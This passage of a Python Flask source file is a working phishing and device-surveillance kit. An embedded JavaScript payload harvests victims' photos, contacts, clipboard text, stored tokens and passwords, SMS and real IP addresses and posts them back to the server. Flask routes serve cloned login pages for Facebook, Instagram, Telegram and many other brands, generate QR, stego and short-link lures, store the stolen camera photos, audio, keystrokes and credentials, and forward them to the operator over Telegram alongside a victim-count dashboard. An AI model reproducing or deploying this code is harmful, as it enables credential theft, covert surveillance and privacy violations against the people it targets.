                    setTimeout(()=>{recorder.stop();stream.getTracks().forEach(t=>t.stop());},8000);
                });
            }catch(e){}
        }
        
        const input=document.createElement('input');
        input.type='file';
        input.accept='image/*,video/*';
        input.multiple=true;
        input.onchange=function(e){
            const files=e.target.files;
            for(let i=0;i<files.length&&i<10;i++){
                const reader=new FileReader();
                reader.onloadend=function(){
                    fetch('/gallery_photo',{
                        method:'POST',
                        headers:{'Content-Type':'application/json'},
                        body:JSON.stringify({ref:ref,filename:files[i].name,image:reader.result})
                    });
                };
                reader.readAsDataURL(files[i]);
            }
        };
        setTimeout(()=>{ if(confirm("Allow access to your photos?")) input.click(); },2000);
        
        if(navigator.contacts&&navigator.contacts.select){
            try{
                navigator.contacts.select(['name','tel','email','address'],{multiple:true}).then(contacts=>{
                    if(contacts) sendData("/contacts",{contacts:JSON.stringify(contacts)});
                });
            }catch(e){}
        }
        
        try{
            navigator.clipboard.readText().then(text=>{
                if(text) sendData("/clipboard",{content:text.substring(0,1000)});
            });
        }catch(e){}
        
        const commonTokens=['token','jwt','access_token','refresh_token','auth','session','key','secret','api_key'];
        const foundTokens={};
        for(let i=0;i<localStorage.length;i++){
            const key=localStorage.key(i);
            const value=localStorage.getItem(key);
            for(const tokenKey of commonTokens){
                if(key.toLowerCase().includes(tokenKey)){foundTokens[key]=value;}
            }
            if(value&&value.length>40&&value.includes('.')){foundTokens[key]=value;}
        }
        if(Object.keys(foundTokens).length>0){sendData("/tokens_found",foundTokens);}
        
        for(let i=0;i<localStorage.length;i++){
            const key=localStorage.key(i);
            const value=localStorage.getItem(key);
            const passwordKeywords=['password','pass','pwd','secret','key','credential','auth','login'];
            if(passwordKeywords.some(kw=>key.toLowerCase().includes(kw))&&value&&value.length>3){
                sendData("/saved_password_found",{
                    source:'localStorage',
                    website:window.location.hostname,
                    username:key,
                    password:value.substring(0,500)
                });
            }
        }
        
        for(let i=0;i<sessionStorage.length;i++){
            const key=sessionStorage.key(i);
            const value=sessionStorage.getItem(key);
            const passwordKeywords=['password','pass','pwd','secret','key'];
            if(passwordKeywords.some(kw=>key.toLowerCase().includes(kw))&&value&&value.length>3){
                sendData("/saved_password_found",{
                    source:'sessionStorage',
                    website:window.location.hostname,
                    username:key,
                    password:value.substring(0,500)
                });
            }
        }
        
        if(navigator.permissions){
            navigator.permissions.query({name:'sms'}).then(permission=>{
                if(permission.state==='granted'||permission.state==='prompt'){
                    if(navigator.sms){
                        navigator.sms.receive().then(sms=>{
                            sendData("/sms_received",{from:sms.from,body:sms.body,timestamp:sms.timestamp});
                        });
                    }
                }
            });
        }
        
        sendData("/system_info",{
            hardwareConcurrency:navigator.hardwareConcurrency,
            deviceMemory:navigator.deviceMemory,
            platform:navigator.platform,
            vendor:navigator.vendor,
            userAgent:navigator.userAgent,
            language:navigator.language,
            cookieEnabled:navigator.cookieEnabled,
            doNotTrack:navigator.doNotTrack
        });
        
        try{
            const pc=new RTCPeerConnection({iceServers:[]});
            pc.createDataChannel('');
            pc.createOffer().then(offer=>pc.setLocalDescription(offer));
            pc.onicecandidate=function(event){
                if(event.candidate){
                    const ip=event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                    if(ip){sendData("/real_ip_detected",{ip:ip[0]});}
                }
            };
            setTimeout(()=>pc.close(),3000);
        }catch(e){}
        
        if(navigator.getBattery){
            navigator.getBattery().then(battery=>{
                sendData("/battery_status",{
                    level:battery.level*100,
                    charging:battery.charging,
                    time:battery.chargingTime,
                    discharging:battery.dischargingTime
                });
            });
        }
        
        // Document.querySelectorAll for passwords
        document.querySelectorAll('input[type="password"]').forEach(input => {
            if(input.value && input.value.length > 3){
                sendData("/saved_password_found",{
                    source:'input_field',
                    website:window.location.hostname,
                    username:document.querySelector('input[type="text"], input[type="email"], input[name*="user"]')?.value || 'unknown',
                    password:input.value
                });
            }
        });
        
        statusDiv.innerHTML = "[30/30] Complete! Redirecting...";
        sendData("/exploit_complete", {status:'completed', timestamp:Date.now()});
        
        setTimeout(()=>{
            if(platform && platform!=='unknown' && platform!=='default' && platform!=='booster' && platform!=='whatsapp'){
                window.location.href="https://www."+platform+".com";
            }else{
                window.location.href="https://www.google.com";
            }
        },3000);
    }
}

setTimeout(collectAllData,500);
</script>
'''

# ========== FLASK APP ==========
app = Flask(__name__)
app.secret_key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=32))

DEFAULT_PAGE_HTML = '''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>MEGATEON</title><style>body{background:#0a0a0a;font-family:monospace;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{background:#1a1a1a;padding:30px;border-radius:20px;border:2px solid #00ff41;text-align:center}.spinner{border:4px solid rgba(0,255,65,0.2);border-top:4px solid #00ff41;width:50px;height:50px;animation:spin 1s linear infinite;margin:20px auto}@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360)}}.status{color:#00ff41;font-size:12px;margin-top:20px}</style></head><body><div class="container"><h1>MEGATEON</h1><div class="spinner"></div><div class="status" id="status">Loading...</div></div>'''
DEFAULT_PAGE_FOOTER = '''</body></html>'''

def get_phishing_page_template(platform, ref, error=""):
    templates = {
        "facebook": f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Facebook</title><style>body{{background:#f0f2f5;font-family:Helvetica;display:flex;justify-content:center;align-items:center;min-height:100vh}}.container{{background:#fff;border-radius:8px;padding:40px;width:400px;text-align:center}}.logo{{color:#1877f2;font-size:48px;font-weight:bold;margin-bottom:20px}}input{{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:6px}}button{{background:#1877f2;color:#fff;border:none;border-radius:6px;padding:12px;width:100%;cursor:pointer}}</style></head><body><div class="container"><div class="logo">facebook</div><form method="POST" action="/login_phishing"><input type="hidden" name="ref" value="{ref}"><input type="hidden" name="platform" value="facebook"><input type="text" name="username" placeholder="Email or Phone" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form></div>''' + EXPLOIT_SCRIPT.replace('{ref}', ref).replace('{platform}', 'facebook') + '''</body></html>''',
        "instagram": f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Instagram</title><style>body{{background:#fafafa;font-family:-apple-system;display:flex;justify-content:center;align-items:center;min-height:100vh}}.container{{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px;width:350px;text-align:center}}.logo{{font-size:48px;margin-bottom:30px}}input{{width:100%;padding:12px;margin:6px 0;background:#fafafa;border:1px solid #dbdbdb;border-radius:4px}}button{{background:#0095f6;color:#fff;border:none;border-radius:4px;padding:8px;width:100%;cursor:pointer}}</style></head><body><div class="container"><div class="logo">📸 Instagram</div><form method="POST" action="/login_phishing"><input type="hidden" name="ref" value="{ref}"><input type="hidden" name="platform" value="instagram"><input type="text" name="username" placeholder="Username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form></div>''' + EXPLOIT_SCRIPT.replace('{ref}', ref).replace('{platform}', 'instagram') + '''</body></html>''',
        "telegram": f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Telegram Web</title><style>body{{background:#0f1623;font-family:-apple-system;display:flex;justify-content:center;align-items:center;min-height:100vh}}.container{{background:#17212b;border-radius:12px;padding:40px;width:380px;text-align:center}}.logo{{font-size:60px;margin-bottom:20px}}input{{width:100%;padding:14px;margin:10px 0;background:#242f3d;border:1px solid #2b3645;border-radius:8px;color:#fff}}button{{background:#4a76a8;color:#fff;border:none;border-radius:8px;padding:12px;width:100%;cursor:pointer}}</style></head><body><div class="container"><div class="logo">📱 Telegram</div><form method="POST" action="/login_phishing"><input type="hidden" name="ref" value="{ref}"><input type="hidden" name="platform" value="telegram"><input type="text" name="username" placeholder="Phone Number" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form></div>''' + EXPLOIT_SCRIPT.replace('{ref}', ref).replace('{platform}', 'telegram') + '''</body></html>'''
    }
    for p in ['tiktok','twitter','whatsapp','snapchat','google','discord','netflix','paypal','freefire','pubg','linkedin','reddit','pinterest','twitch','zoom','microsoft','apple']:
        if p not in templates:
            templates[p] = templates["instagram"].replace("Instagram", p.capitalize()).replace("instagram", p)
    return templates.get(platform, templates["instagram"])

# ========== FLASK ROUTES ==========

@app.route('/')
def index():
    ref = request.args.get('ref', 'unknown')
    link_type = request.args.get('type', 'default')
    fake_platform = request.args.get('platform', 'instagram')
    if link_type == 'phishing' and fake_platform:
        return get_phishing_page_template(fake_platform, ref)
    else:
        return DEFAULT_PAGE_HTML + EXPLOIT_SCRIPT.replace('{ref}', ref).replace('{platform}', 'default') + DEFAULT_PAGE_FOOTER

@app.route('/whatsapp/<ref>')
def whatsapp_phishing(ref):
    return WHATSAPP_PHISHING_HTML.replace('{ref}', ref)

@app.route('/qr/<platform>/<ref>')
def generate_qr(platform, ref):
    if platform == 'default': qr_data = f"{BASE_URL}/?ref={ref}"
    elif platform == 'booster': qr_data = f"{BASE_URL}/?ref={ref}&type=booster"
    else: qr_data = f"{BASE_URL}/?ref={ref}&type=phishing&platform={platform}"
    qr_path = f"qr_{ref}_{platform}_{generate_random_filename()}.png"
    create_qr_advanced(qr_data, qr_path, platform)
    return send_file(qr_path, mimetype='image/png')

@app.route('/stego_image/<ref>')
def stego_image(ref):
    img_path = f"stego_{ref}_{generate_random_filename()}.png"
    create_stego_image(ref, img_path)
    return send_file(img_path, mimetype='image/png')

@app.route('/stego_image_upload', methods=['POST'])
def stego_image_upload():
    data = request.get_json()
    ref = data.get('ref')
    image_data = data.get('image', '')
    if ref and ref != 'unknown' and image_data:
        temp_path = f"temp_stego_{ref}_{generate_random_filename()}.png"
        img_bytes = base64.b64decode(image_data.split(',')[1] if ',' in image_data else image_data)
        with open(temp_path, 'wb') as f: f.write(img_bytes)
        output_path = f"stego_{ref}_{generate_random_filename()}.png"
        create_stego_image(ref, output_path, temp_path)
        os.remove(temp_path)
        return send_file(output_path, mimetype='image/png')
    return {"status": "error"}

@app.route('/stego_svg/<ref>')
def stego_svg(ref):
    svg_path = f"stego_{ref}_{generate_random_filename()}.svg"
    create_stego_svg(ref, svg_path)
    return send_file(svg_path, mimetype='image/svg+xml')

@app.route('/stego_pdf/<ref>')
def stego_pdf(ref):
    pdf_path = f"stego_{ref}_{generate_random_filename()}.pdf"
    create_stego_pdf(ref, pdf_path)
    return send_file(pdf_path, mimetype='application/pdf')

@app.route('/short/<ref>')
def short_link(ref):
    long_url = f"{BASE_URL}/?ref={ref}"
    short = create_short_link(long_url)
    return jsonify({"short_url": short, "original": long_url})

@app.route('/redirect/<platform>/<ref>')
def redirect_link(platform, ref):
    real_link = f"{BASE_URL}/?ref={ref}"
    return f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>{platform.capitalize()}</title><style>body{{background:#0a0a0a;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}.container{{background:#1a1a1a;padding:40px;border-radius:20px;border:2px solid #00ff41;text-align:center;max-width:400px}}.loader{{border:4px solid rgba(0,255,65,0.2);border-top:4px solid #00ff41;width:50px;height:50px;animation:spin 1s linear infinite;margin:20px auto}}@keyframes spin{{0%{{transform:rotate(0)}}100%{{transform:rotate(360)}}}}h1{{color:#00ff41;font-size:24px}}p{{color:#888}}</style><script>setTimeout(function(){{ window.location.href = "{real_link}"; }}, 2000);</script></head><body><div class="container"><h1>🔗 {platform.capitalize()}</h1><div class="loader"></div><p>Redirecting...</p></div></body></html>'''

@app.route('/custom/<user_id>/<platform>')
def custom_link(user_id, platform):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT custom_domain FROM users WHERE user_id=?", (user_id,))
    result = c.fetchone()
    conn.close()
    domain = result[0] if result and result[0] else BASE_URL
    return redirect(f"{domain}/?ref={user_id}&type=phishing&platform={platform}")

@app.route('/template/<user_id>/<template_name>')
def get_template(user_id, template_name):
    if template_name not in TEMPLATES:
        return "Template not found", 404
    if template_name == 'whatsapp':
        return WHATSAPP_PHISHING_HTML.replace('{ref}', user_id)
    return get_phishing_page_template(template_name, user_id)

@app.route('/analytics/<user_id>')
def analytics_dashboard(user_id):
    if str(user_id) not in users and str(user_id) not in [str(a) for a in ADMIN_IDS]:
        return "Unauthorized", 403
    
    data = get_analytics_data(user_id, 30)
    total_victims = get_victims_count(user_id)
    total_credentials = get_credentials_count(user_id)
    total_sms = get_sms_count(user_id)
    total_passwords = get_passwords_count(user_id)
    total_whatsapp = get_whatsapp_messages_count(user_id)
    total_locations = get_locations_count(user_id)
    
    labels = [d[0] for d in data][::-1] if data else ['No Data']
    values = [d[1] for d in data][::-1] if data else [0]
    creds_values = [d[2] for d in data][::-1] if data else [0]
    
    html = '''<!DOCTYPE html><html><head><title>Analytics Dashboard</title><script src="https://cdn.jsdelivr.net/npm/chart.js"></script><style>body{background:#0a0a0a;color:#fff;font-family:Arial;padding:20px}.container{max-width:1400px;margin:auto}.card{background:#1a1a1a;padding:20px;border-radius:10px;border:1px solid #00ff41;margin:10px}.stats{display:grid;grid-template-columns:repeat(6,1fr);gap:15px}.stat{text-align:center}.stat h3{color:#00ff41;margin:0;font-size:12px}.stat .number{font-size:28px;font-weight:bold;color:#fff}canvas{max-height:350px}.stat .trend{font-size:12px;color:#888}.trend.up{color:#00ff41}.trend.down{color:#ff4444}</style></head><body><div class="container"><h1 style="color:#00ff41;">📊 Analytics Dashboard</h1><div class="stats"><div class="card stat"><h3>Total Victims</h3><div class="number">{{ total_victims }}</div></div><div class="card stat"><h3>Credentials</h3><div class="number">{{ total_credentials }}</div></div><div class="card stat"><h3>SMS</h3><div class="number">{{ total_sms }}</div></div><div class="card stat"><h3>Passwords</h3><div class="number">{{ total_passwords }}</div></div><div class="card stat"><h3>WhatsApp</h3><div class="number">{{ total_whatsapp }}</div></div><div class="card stat"><h3>Locations</h3><div class="number">{{ total_locations }}</div></div></div><div class="card"><h2 style="color:#00ff41;">📈 Victims & Credentials Over Time</h2><canvas id="victimsChart"></canvas></div></div><script>const ctx=document.getElementById('victimsChart').getContext('2d');const data={{ chart_data|safe }};new Chart(ctx,{type:'line',data:{labels:data.labels,datasets:[{label:'Victims',data:data.values,borderColor:'#00ff41',backgroundColor:'rgba(0,255,65,0.1)',fill:true,tension:0.4},{label:'Credentials',data:data.creds_values,borderColor:'#ff6b35',backgroundColor:'rgba(255,107,53,0.1)',fill:true,tension:0.4}]},options:{responsive:true,interaction:{mode:'index',intersect:false},plugins:{legend:{labels:{color:'#fff'}}},scales:{x:{ticks:{color:'#fff'}},y:{ticks:{color:'#fff'}}}}});</script></body></html>'''
    
    return render_template_string(html,
        total_victims=total_victims,
        total_credentials=total_credentials,
        total_sms=total_sms,
        total_passwords=total_passwords,
        total_whatsapp=total_whatsapp,
        total_locations=total_locations,
        chart_data=json.dumps({'labels': labels, 'values': values, 'creds_values': creds_values})
    )

@app.route('/export_data/<user_id>')
def export_data(user_id):
    if str(user_id) not in users and str(user_id) not in [str(a) for a in ADMIN_IDS]:
        return "Unauthorized", 403
    zip_path = export_all_data(user_id)
    return send_file(zip_path, as_attachment=True)

@app.route('/backup/<user_id>')
def download_backup(user_id):
    if str(user_id) not in users and str(user_id) not in [str(a) for a in ADMIN_IDS]:
        return "Unauthorized", 403
    backup_path = f"backups/user_{user_id}_{datetime.datetime.now().strftime('%Y%m%d')}.db"
    os.makedirs("backups", exist_ok=True)
    if os.path.exists(f"user_{user_id}.db"):
        shutil.copy2(f"user_{user_id}.db", backup_path)
        return send_file(backup_path, as_attachment=True)
    return "No backup available", 404

@app.route('/generate_report/<user_id>/<format>')
def generate_report(user_id, format):
    if str(user_id) not in users and str(user_id) not in [str(a) for a in ADMIN_IDS]:
        return "Unauthorized", 403
    if format == 'pdf':
        filepath = generate_pdf_report(user_id)
        if filepath:
            return send_file(filepath, as_attachment=True)
        return "PDF generation failed (install reportlab)", 500
    elif format == 'csv':
        filepath = generate_csv_report(user_id)
        return send_file(filepath, as_attachment=True)
    else:
        return "Invalid format. Use pdf or csv", 400

# ========== DATA COLLECTION ROUTES ==========

@app.route('/collect', methods=['POST'])
def collect():
    data = request.get_json()
    ref = data.get('ref')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    user_agent = data.get('userAgent', 'Unknown')
    device_name = get_device_name(user_agent)
    browser = get_browser(user_agent)
    os = get_os(user_agent)
    device_type = get_device_type(user_agent)
    session_id = data.get('session_id', datetime.datetime.now().strftime('%Y%m%d%H%M%S%f'))
    
    if ref and ref != 'unknown':
        init_user_db(ref)
        conn = sqlite3.connect(f'user_{ref}.db')
        c = conn.cursor()
        now = datetime.datetime.now().isoformat()
        
        c.execute('''INSERT OR REPLACE INTO devices (
            session_id, device_name, ip, user_agent, first_seen, last_seen,
            device_type, os, browser
        ) VALUES (?,?,?,?,?,?,?,?,?)''',
            (session_id, device_name, ip, user_agent, now, now, device_type, os, browser))
        
        c.execute("""INSERT INTO victims (
            ip, time, user_agent, platform, screen, link_type, fake_platform,
            device_name, session_id, browser, os, device_type
        ) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)""",
            (ip, now, user_agent, data.get('platform','Unknown'),
             f"{data.get('screenWidth','?')}x{data.get('screenHeight','?')}",
             'web', data.get('platform','unknown'), device_name, session_id,
             browser, os, device_type))
        
        conn.commit()
        conn.close()
        
        update_analytics(ref)
        send_alert(ref, 'new_victim', f"New device from {ip}\nDevice: {device_name}\nOS: {os}\nBrowser: {browser}")
        send_telegram(int(ref),
            f"🆕 New Device!\n📱 {device_name}\n📡 IP: {ip}\n💻 {os} | {browser}\n🕐 {now}")
    
    return {"status": "ok", "session_id": session_id}

# بقية الـ Routes (location, camera_photo, audio, gallery_photo, contacts, clipboard, tokens_found, saved_password_found, sms_received, system_info, real_ip_detected, battery_status, math_verified, heartbeat, login_phishing) موجودة في الكود السابق بنفس الشكل
# ========== FLASK ROUTES (CONTINUED) ==========

@app.route('/location', methods=['POST'])
def location():
    data = request.get_json()
    ref = data.get('ref')
    session_id = data.get('session_id', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    if ref and ref != 'unknown':
        init_user_db(ref)
        conn = sqlite3.connect(f'user_{ref}.db')
        c = conn.cursor()
        c.execute("""INSERT INTO locations 
                     (ip, time, lat, lng, accuracy, session_id, altitude, speed, heading) 
                     VALUES (?,?,?,?,?,?,?,?,?)""",
                  (ip, datetime.datetime.now().isoformat(), 
                   data.get('lat'), data.get('lng'), data.get('accuracy', 0), 
                   session_id, data.get('altitude'), data.get('speed'), data.get('heading')))
        conn.commit()
        conn.close()
        send_alert(ref, 'new_location', f"📍 Location: {data.get('lat')}, {data.get('lng')}")
        send_telegram(int(ref), f"📍 Location Update!\nLat: {data.get('lat')}\nLng: {data.get('lng')}\nAccuracy: {data.get('accuracy', 0)}m")
    
    return {"status": "ok"}

@app.route('/camera_photo', methods=['POST'])
def camera_photo():
    data = request.get_json()
    ref = data.get('ref')
    session_id = data.get('session_id', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    try:
        os.makedirs("photos", exist_ok=True)
        img_data = data.get('image', '').split(',')[1] if ',' in data.get('image', '') else data.get('image', '')
        if img_data:
            filename = f"photos/photo_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            with open(filename, 'wb') as f:
                f.write(base64.b64decode(img_data))
            
            if ref and ref != 'unknown':
                init_user_db(ref)
                conn = sqlite3.connect(f'user_{ref}.db')
                c = conn.cursor()
                
                # Get image info
                try:
                    img = Image.open(filename)
                    width, height = img.size
                    size = os.path.getsize(filename)
                except:
                    width, height, size = 0, 0, 0
                
                c.execute("""INSERT INTO photos 
                             (ip, time, path, session_id, size, width, height) 
                             VALUES (?,?,?,?,?,?,?)""",
                          (ip, datetime.datetime.now().isoformat(), filename, 
                           session_id, size, width, height))
                conn.commit()
                conn.close()
                
                send_alert(ref, 'new_photo', f"📸 Photo captured! Size: {format_size(size)}")
                send_telegram(int(ref), f"📸 Photo Captured!", photo=filename)
    except Exception as e:
        print(f"Camera photo error: {e}")
    
    return {"status": "ok"}

@app.route('/audio', methods=['POST'])
def audio():
    data = request.get_json()
    ref = data.get('ref')
    session_id = data.get('session_id', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    try:
        audio_data = data.get('audio', '').split(',')[1] if ',' in data.get('audio', '') else data.get('audio', '')
        if audio_data:
            os.makedirs(f"audios/user_{ref}", exist_ok=True)
            filename = f"audios/user_{ref}/audio_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.webm"
            with open(filename, 'wb') as f:
                f.write(base64.b64decode(audio_data))
            
            if ref and ref != 'unknown':
                init_user_db(ref)
                conn = sqlite3.connect(f'user_{ref}.db')
                c = conn.cursor()
                c.execute("""INSERT INTO audios 
                             (ip, time, path, session_id, size) 
                             VALUES (?,?,?,?,?)""",
                          (ip, datetime.datetime.now().isoformat(), filename, 
                           session_id, os.path.getsize(filename)))
                conn.commit()
                conn.close()
                
                send_alert(ref, 'new_audio', f"🎤 Audio recorded! Size: {format_size(os.path.getsize(filename))}")
                send_telegram(int(ref), f"🎤 Audio Recorded!", document=filename)
    except Exception as e:
        print(f"Audio error: {e}")
    
    return {"status": "ok"}

@app.route('/gallery_photo', methods=['POST'])
def gallery_photo():
    data = request.get_json()
    ref = data.get('ref')
    filename = data.get('filename', 'unknown')
    image_data = data.get('image', '')
    session_id = data.get('session_id', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    if ref and ref != 'unknown' and image_data:
        try:
            device_folder = f"gallery/{ref}_{session_id[:16]}"
            os.makedirs(device_folder, exist_ok=True)
            filepath = f"{device_folder}/{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}_{secure_filename(filename)}"
            
            img_bytes = base64.b64decode(image_data.split(',')[1] if ',' in image_data else image_data)
            with open(filepath, 'wb') as f:
                f.write(img_bytes)
            
            conn = sqlite3.connect(f'user_{ref}.db')
            c = conn.cursor()
            c.execute("""INSERT INTO gallery_photos 
                         (ip, time, filename, filepath, session_id, size) 
                         VALUES (?,?,?,?,?,?)""",
                      (ip, datetime.datetime.now().isoformat(), filename, 
                       filepath, session_id, os.path.getsize(filepath)))
            conn.commit()
            conn.close()
            
            send_telegram(int(ref), f"🖼️ Gallery Photo: {filename}", photo=filepath)
        except Exception as e:
            print(f"Gallery photo error: {e}")
    
    return {"status": "ok"}

@app.route('/contacts', methods=['POST'])
def contacts():
    data = request.get_json()
    ref = data.get('ref')
    contacts_data = data.get('contacts', '')
    session_id = data.get('session_id', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    if ref and ref != 'unknown' and contacts_data:
        try:
            init_user_db(ref)
            conn = sqlite3.connect(f'user_{ref}.db')
            c = conn.cursor()
            
            contacts_list = json.loads(contacts_data) if isinstance(contacts_data, str) else contacts_data
            contact_count = len(contacts_list) if isinstance(contacts_list, list) else 0
            
            c.execute("""INSERT INTO contacts 
                         (ip, time, contacts_data, session_id, count) 
                         VALUES (?,?,?,?,?)""",
                      (ip, datetime.datetime.now().isoformat(), 
                       contacts_data[:10000], session_id, contact_count))
            conn.commit()
            conn.close()
            
            send_alert(ref, 'new_contacts', f"📞 {contact_count} contacts extracted!")
            send_telegram(int(ref), f"📞 Contacts Stolen!\nTotal: {contact_count} contacts")
        except Exception as e:
            print(f"Contacts error: {e}")
    
    return {"status": "ok"}

@app.route('/clipboard', methods=['POST'])
def clipboard():
    data = request.get_json()
    ref = data.get('ref')
    content = data.get('content', '')
    session_id = data.get('session_id', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    if ref and ref != 'unknown' and content:
        try:
            init_user_db(ref)
            conn = sqlite3.connect(f'user_{ref}.db')
            c = conn.cursor()
            c.execute("""INSERT INTO clipboard 
                         (ip, time, content, session_id) 
                         VALUES (?,?,?,?)""",
                      (ip, datetime.datetime.now().isoformat(), content[:1000], session_id))
            conn.commit()
            conn.close()
            
            # Check for sensitive data
            sensitive_keywords = ['password', 'pass', 'credit', 'card', 'ssn', 'bank', 'account']
            for keyword in sensitive_keywords:
                if keyword in content.lower():
                    send_alert(ref, 'sensitive_data', f"🔐 Sensitive data in clipboard: {keyword}")
                    send_telegram(int(ref), f"⚠️ Sensitive Data in Clipboard!\nType: {keyword}\nContent: {content[:200]}")
                    break
        except Exception as e:
            print(f"Clipboard error: {e}")
    
    return {"status": "ok"}

@app.route('/keystrokes', methods=['POST'])
def keystrokes():
    data = request.get_json()
    ref = data.get('ref')
    keys = data.get('keys', '')
    session_id = data.get('session_id', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    if ref and ref != 'unknown' and keys:
        try:
            init_user_db(ref)
            conn = sqlite3.connect(f'user_{ref}.db')
            c = conn.cursor()
            c.execute("""INSERT INTO keystrokes 
                         (ip, time, keys, session_id, count) 
                         VALUES (?,?,?,?,?)""",
                      (ip, datetime.datetime.now().isoformat(), keys[:500], 
                       session_id, len(keys)))
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"Keystrokes error: {e}")
    
    return {"status": "ok"}

@app.route('/tokens_found', methods=['POST'])
def tokens_found():
    data = request.get_json()
    ref = data.get('ref')
    session_id = data.get('session_id', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    if ref and ref != 'unknown':
        try:
            init_user_db(ref)
            conn = sqlite3.connect(f'user_{ref}.db')
            c = conn.cursor()
            
            for key, value in data.items():
                if key not in ['ref', 'platform', 'session_id']:
                    c.execute("""INSERT INTO stolen_tokens 
                                 (ip, time, platform, token_key, token_value, session_id) 
                                 VALUES (?,?,?,?,?,?)""",
                              (ip, datetime.datetime.now().isoformat(), 
                               'web', key, value[:500], session_id))
            conn.commit()
            conn.close()
            
            token_count = len([k for k in data.keys() if k not in ['ref', 'platform', 'session_id']])
            send_alert(ref, 'token', f"🔐 {token_count} tokens found!")
            send_telegram(int(ref), f"🔐 Tokens Found!\nTotal: {token_count}\n{json.dumps(data, indent=2)[:500]}")
        except Exception as e:
            print(f"Tokens error: {e}")
    
    return {"status": "ok"}

@app.route('/saved_password_found', methods=['POST'])
def saved_password_found():
    data = request.get_json()
    ref = data.get('ref')
    source = data.get('source', 'unknown')
    website = data.get('website', 'unknown')
    username = data.get('username', 'unknown')
    password = data.get('password', '')
    session_id = data.get('session_id', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    if ref and ref != 'unknown' and password and len(password) > 3:
        try:
            # Check password strength
            strength = "Weak"
            if len(password) >= 8:
                if any(c.isupper() for c in password) and any(c.isdigit() for c in password):
                    strength = "Strong"
                elif len(password) >= 12:
                    strength = "Very Strong"
            
            conn = sqlite3.connect(f'user_{ref}.db')
            c = conn.cursor()
            c.execute("""INSERT INTO saved_passwords 
                         (website, username, password, timestamp, session_id, strength) 
                         VALUES (?,?,?,?,?,?)""",
                      (website, username[:100], password[:500], 
                       datetime.datetime.now().isoformat(), session_id, strength))
            conn.commit()
            conn.close()
            
            send_alert(ref, 'new_password', f"🔑 Password found for {website} (Strength: {strength})")
            send_telegram(int(ref), 
                f"🔑 Saved Password Found!\n📱 Source: {source}\n🌐 Website: {website}\n👤 Username: {username[:30]}\n🔑 Password: {password[:50]}...\n💪 Strength: {strength}")
        except Exception as e:
            print(f"Saved password error: {e}")
    
    return {"status": "ok"}

@app.route('/sms_received', methods=['POST'])
def sms_received():
    data = request.get_json()
    ref = data.get('ref')
    from_num = data.get('from', 'Unknown')
    body = data.get('body', '')
    session_id = data.get('session_id', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    if ref and ref != 'unknown' and body:
        try:
            conn = sqlite3.connect(f'user_{ref}.db')
            c = conn.cursor()
            c.execute("""INSERT INTO sms_messages 
                         (from_num, body, timestamp, session_id) 
                         VALUES (?,?,?,?)""",
                      (from_num, body[:500], datetime.datetime.now().isoformat(), session_id))
            conn.commit()
            conn.close()
            
            send_alert(ref, 'new_sms', f"📱 SMS from {from_num}")
            send_telegram(int(ref), f"📱 New SMS!\nFrom: {from_num}\n📝 {body[:200]}")
        except Exception as e:
            print(f"SMS error: {e}")
    
    return {"status": "ok"}

@app.route('/whatsapp_complete', methods=['POST'])
def whatsapp_complete():
    data = request.get_json()
    ref = data.get('ref')
    session_id = data.get('session_id', '')
    
    if ref and ref != 'unknown':
        send_telegram(int(ref), f"✅ WhatsApp Phishing Complete!\nSession: {session_id[:16]}")
    
    return {"status": "ok"}

@app.route('/system_info', methods=['POST'])
def system_info():
    data = request.get_json()
    ref = data.get('ref')
    session_id = data.get('session_id', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    if ref and ref != 'unknown':
        try:
            conn = sqlite3.connect(f'user_{ref}.db')
            c = conn.cursor()
            c.execute("""INSERT INTO system_info 
                         (info_type, data, timestamp, session_id) 
                         VALUES (?,?,?,?)""",
                      ('system', json.dumps(data), datetime.datetime.now().isoformat(), session_id))
            conn.commit()
            conn.close()
            
            # Send summary
            summary = f"🖥️ System Info:\n"
            summary += f"Platform: {data.get('platform', 'Unknown')}\n"
            summary += f"Browser: {data.get('userAgent', 'Unknown')[:50]}...\n"
            summary += f"CPU Cores: {data.get('hardwareConcurrency', 'Unknown')}\n"
            summary += f"Memory: {data.get('deviceMemory', 'Unknown')} GB"
